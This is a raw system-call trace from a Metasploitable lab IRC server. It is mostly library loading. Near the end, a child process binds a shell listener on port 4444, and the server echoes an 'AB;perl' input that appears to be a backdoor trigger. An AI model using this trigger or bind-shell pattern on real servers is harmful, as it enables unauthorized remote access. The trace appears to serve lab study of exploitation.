11809 20:20:27.580032 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580044 stat64("/lib/tls/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580056 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580068 stat64("/lib/tls/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580079 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580091 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.580108 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580120 stat64("/lib/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580131 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580144 stat64("/lib/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580155 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580167 stat64("/lib/i686/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580178 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580190 stat64("/lib/i686", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580200 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580212 stat64("/lib/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580223 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580241 stat64("/lib/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580252 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580264 stat64("/lib/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580275 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580286 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.580303 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580316 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580328 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580341 stat64("/usr/lib/tls/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580352 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580365 stat64("/usr/lib/tls/i686/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580376 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580389 stat64("/usr/lib/tls/i686", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580400 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580412 stat64("/usr/lib/tls/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580424 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580436 stat64("/usr/lib/tls/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580448 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580460 stat64("/usr/lib/tls/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580471 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580483 stat64("/usr/lib/tls", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580494 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580513 stat64("/usr/lib/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580554 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580567 stat64("/usr/lib/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580579 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580607 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.580624 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580637 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.580654 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580667 stat64("/usr/lib/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580678 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580690 stat64("/usr/lib/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580701 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580714 stat64("/usr/lib/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580725 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580736 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
11809 20:20:27.580753 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580771 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580784 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580797 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580809 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580822 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580835 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580847 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580859 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580873 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580885 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580898 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580910 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580922 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580934 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580947 stat64("/lib/i486-linux-gnu/tls", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580959 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580972 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.580984 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.580997 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581017 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581058 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581070 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581097 stat64("/lib/i486-linux-gnu/i686", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581109 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581122 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581134 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581147 stat64("/lib/i486-linux-gnu/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581159 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581171 stat64("/lib/i486-linux-gnu/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581183 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581195 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.581213 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581227 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581240 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581257 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581270 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581283 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581296 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581309 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581322 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581335 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581348 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581361 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581374 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581387 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581399 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581412 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581424 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581438 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581450 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581464 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581476 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581489 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581508 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581522 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581534 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581548 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581560 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581573 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581585 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581598 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfd4e9ec) = -1 ENOENT (No such file or directory)
11809 20:20:27.581610 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11809 20:20:27.581623 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11809 20:20:27.581643 munmap(0xb7da2000, 29913) = 0
11809 20:20:27.581663 open("/etc/ld.so.cache", O_RDONLY) = 6
11809 20:20:27.581676 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11809 20:20:27.581692 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7da2000
11809 20:20:27.581703 close(6)          = 0
11809 20:20:27.581713 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11809 20:20:27.581728 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
11809 20:20:27.581743 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11809 20:20:27.581839 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
11809 20:20:27.581862 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d97000
11809 20:20:27.581874 mmap2(0xb7da0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7da0000
11809 20:20:27.581891 close(6)          = 0
11809 20:20:27.581916 munmap(0xb7da2000, 29913) = 0
11809 20:20:27.581933 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
11809 20:20:27.581949 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
11809 20:20:27.581965 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
11809 20:20:27.581983 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da9000
11809 20:20:27.582551 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
11809 20:20:27.582919 close(6)          = 0
11809 20:20:27.582982 munmap(0xb7da9000, 4096) = 0
11809 20:20:27.583027 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
11809 20:20:27.583057 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
11809 20:20:27.583085 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da9000
11809 20:20:27.583100 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
11809 20:20:27.583287 close(6)          = 0
11809 20:20:27.583297 munmap(0xb7da9000, 4096) = 0
11809 20:20:27.583325 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
11809 20:20:27.583349 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4eef8) = -1 EINVAL (Invalid argument)
11809 20:20:27.583365 _llseek(6, 0, 0xbfd4ef40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11809 20:20:27.583377 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4eef8) = -1 EINVAL (Invalid argument)
11809 20:20:27.583392 _llseek(6, 0, 0xbfd4ef40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11809 20:20:27.583423 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
11809 20:20:27.583495 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
11809 20:20:27.583532 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
11809 20:20:27.583558 listen(6, 5)      = 0
11809 20:20:27.583615 accept(6,  <unfinished ...>
11808 20:20:27.583897 exit_group(0)     = ?
11806 20:20:27.669238 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 11808
11806 20:20:27.669238 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11806 20:20:27.669238 --- SIGCHLD (Child exited) @ 0 (0) ---
11806 20:20:27.669238 waitpid(-1, 0xbf92cca8, WNOHANG) = -1 ECHILD (No child processes)
11806 20:20:27.669239 sigreturn()       = ? (mask now [])
11806 20:20:27.669239 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
11806 20:20:27.669239 exit_group(0)     = ?
4519  20:20:27.669239 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 11806
4519  20:20:27.669242 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  20:20:27.669258 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  20:20:27.669269 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  20:20:27.669279 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  20:20:27.669298 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  20:20:27.669362 time(NULL)        = 1495671627
4519  20:20:27.669374 time(NULL)        = 1495671627
4519  20:20:27.669392 gettimeofday({1495671627, 669396}, NULL) = 0
4519  20:20:27.669406 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:20:27.669449 clock_gettime(CLOCK_MONOTONIC, {48437, 486462707}) = 0
4519  20:20:27.669462 gettimeofday({1495671627, 669466}, NULL) = 0
4519  20:20:27.669474 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 2 (in [4 9], left {1, 0})
4519  20:20:27.669515 clock_gettime(CLOCK_MONOTONIC, {48437, 486528116}) = 0
4519  20:20:27.669527 recv(9, "CPRIVMSG botnick6 #testit0 :lskdfkl", 8192, 0) = 35
4519  20:20:27.669543 recv(4, "PRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  20:20:27.669567 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669585 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:20:27.669599 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
